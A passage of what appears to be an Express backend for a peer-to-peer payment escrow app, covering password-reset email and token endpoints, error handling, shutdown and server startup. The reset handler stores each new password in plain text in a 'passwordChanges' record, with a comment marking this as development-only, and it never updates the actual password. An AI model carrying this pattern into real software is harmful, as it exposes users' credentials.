        createdAt: new Date().toISOString(),
        expiresAt: new Date(Date.now() + 3600000).toISOString(), // 1 hour
        used: false
      });
      await saveDb();
      
      const resetUrl = `${process.env.FRONTEND_URL || 'http://localhost:5173'}/reset-password?token=${resetToken}`;
      
      // Send email
      await emailTransporter.sendMail({
        from: process.env.EMAIL_FROM || 'noreply@yourapp.com',
        to: email,
        subject: 'Reset Your Password - P2P Payment Coordinator',
        html: `
          <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
            <h2>Reset Your Password</h2>
            <p>You requested to reset your password. Click the button below to create a new password:</p>
            <a href="${resetUrl}" style="display: inline-block; background-color: #FF5722; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; margin: 20px 0;">Reset Password</a>
            <p>Or copy and paste this link into your browser:</p>
            <p style="color: #666; word-break: break-all;">${resetUrl}</p>
            <p style="color: #999; font-size: 12px; margin-top: 30px;">
              This link will expire in 1 hour. If you didn't request this password reset, please ignore this email or contact support if you have concerns.
            </p>
            <p style="color: #999; font-size: 12px;">
              For security reasons, we never send your password via email. You must create a new one using the link above.
            </p>
          </div>
        `
      });
      
      return res.json({ success: true, message: 'Password reset email sent. Check your inbox.' });
    } catch (error) {
      console.error('Password reset email error:', error);
      if (process.env.SENTRY_DSN) {
        Sentry.captureException(error);
      }
      return res.status(500).json({ message: 'Failed to send password reset email' });
    }
  }
);

// Password Reset - Verify token and set new password
app.post('/api/auth/reset-password',
  authLimiter,
  [
    body('token').isLength({ min: 1 }).withMessage('Token is required'),
    body('newPassword').isLength({ min: 8 }).withMessage('Password must be at least 8 characters')
  ],
  validate,
  async (req, res) => {
    const { token, newPassword } = req.body;
    
    try {
      // Verify JWT token
      const decoded = jwt.verify(token, JWT_SECRET);
      
      if (decoded.purpose !== 'password-reset') {
        return res.status(400).json({ message: 'Invalid token purpose' });
      }
      
      // Check if token exists and not used
      db.resetTokens = db.resetTokens || [];
      const tokenEntry = db.resetTokens.find(t => t.token === token && !t.used);
      
      if (!tokenEntry) {
        return res.status(400).json({ message: 'Token not found, already used, or expired' });
      }
      
      // Check if expired
      if (new Date() > new Date(tokenEntry.expiresAt)) {
        return res.status(400).json({ message: 'Reset link has expired. Please request a new one.' });
      }
      
      // Mark token as used
      tokenEntry.used = true;
      tokenEntry.usedAt = new Date().toISOString();
      
      // In production, update password in user database
      // For this implementation, we'll update the environment password
      // NOTE: Development mode - storing passwords as plain text
      
      // Store password change record
      db.passwordChanges = db.passwordChanges || [];
      db.passwordChanges.push({
        email: decoded.email,
        role: decoded.role,
        changedAt: new Date().toISOString(),
        newPassword: newPassword // Stored as plain text for development
      });
      
      await saveDb();
      
      // Log audit event
      await logPasswordEvent(req, 'password_reset_success', decoded.email, decoded.role, true);
      
      // Send confirmation email
      if (emailTransporter) {
        try {
          await emailTransporter.sendMail({
            from: process.env.EMAIL_FROM || 'noreply@yourapp.com',
            to: decoded.email,
            subject: 'Password Changed Successfully - P2P Payment Coordinator',
            html: `
              <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
                <h2>Password Changed</h2>
                <p>Your password has been successfully changed.</p>
                <p>If you didn't make this change, please contact support immediately.</p>
                <p style="color: #999; font-size: 12px; margin-top: 30px;">
                  Changed on: ${new Date().toLocaleString()}
                </p>
              </div>
            `
          });
        } catch (emailError) {
          console.error('Failed to send confirmation email:', emailError);
          // Don't fail the request if email fails
        }
      }
      
      return res.json({ 
        success: true, 
        message: 'Password reset successfully. You can now login with your new password.',
        email: decoded.email
      });
    } catch (error) {
      if (error.name === 'TokenExpiredError') {
        return res.status(400).json({ message: 'Reset link has expired. Please request a new one.' });
      }
      console.error('Password reset error:', error);
      if (process.env.SENTRY_DSN) {
        Sentry.captureException(error);
      }
      return res.status(400).json({ message: 'Invalid or expired reset token' });
    }
  }
);

// Sentry error handler must be before any other error middleware
if (process.env.SENTRY_DSN) {
  app.use(Sentry.Handlers.errorHandler());
}

// Global error handler
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  res.status(500).json({ message: 'Internal server error' });
});

// Handle unhandled promise rejections
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
  if (process.env.SENTRY_DSN) {
    Sentry.captureException(reason);
  }
});

// Handle uncaught exceptions
process.on('uncaughtException', (error) => {
  console.error('Uncaught Exception:', error);
  if (process.env.SENTRY_DSN) {
    Sentry.captureException(error);
  }
  process.exit(1);
});

// Graceful shutdown handler
const gracefulShutdown = async (signal) => {
  console.log(`\n${signal} received. Starting graceful shutdown...`);
  
  // Stop accepting new requests
  if (server) {
    server.close(() => {
      console.log('✅ HTTP server closed');
    });
  }
  
  // Close database connections
  await closeDatabase();
  
  // Close Redis connection
  await closeRedis();
  
  // Exit
  console.log('✅ Graceful shutdown complete');
  process.exit(0);
};

// Listen for termination signals
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

let server;

// Initialize database and start server
(async () => {
  try {
    // Initialize database connection
    const dbConfig = await initDatabase();
    useFileStorage = dbConfig.useFileStorage;
    
    // Initialize Redis cache
    await initRedis();
    
    // Load file-based data if using file storage
    if (useFileStorage) {
      await loadDb();
    }
    
    // Start HTTP server (for WebSocket support)
    server = httpServer.listen(PORT, () => {
      console.log(`Escrow backend running on port ${PORT}`);
      console.log(`Storage mode: ${useFileStorage ? 'File-based (development)' : 'PostgreSQL (production)'}`);
    });
    
    // Initialize WebSocket server
    initWebSocket(httpServer);
    
  } catch (error) {
    console.error('Failed to start server:', error);
    process.exit(1);
  }
})();
